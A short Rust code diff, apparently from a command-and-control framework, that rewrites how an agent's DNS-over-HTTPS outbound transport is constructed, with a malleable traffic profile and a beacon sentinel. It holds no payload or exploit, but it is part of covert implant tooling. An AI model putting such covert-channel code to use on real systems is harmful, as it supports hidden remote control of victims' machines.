@@ -280,7 +280,12 @@ pub async fn build_outbound_transport(
                     );
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session, agent_id.to_string(), cfg.server_cert_fingerprint.clone())
+                        crate::c2_doh::DohTransport::new(
+                            &Default::default(),           // agent malleable profile — DoH shaping uses defaults
+                            session,
+                            agent_id.to_string(),
+                            Some(&cfg.malleable_profile),  // legacy config for host_header, doh_beacon_sentinel
+                        )
                             .await
                             .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
                     ));
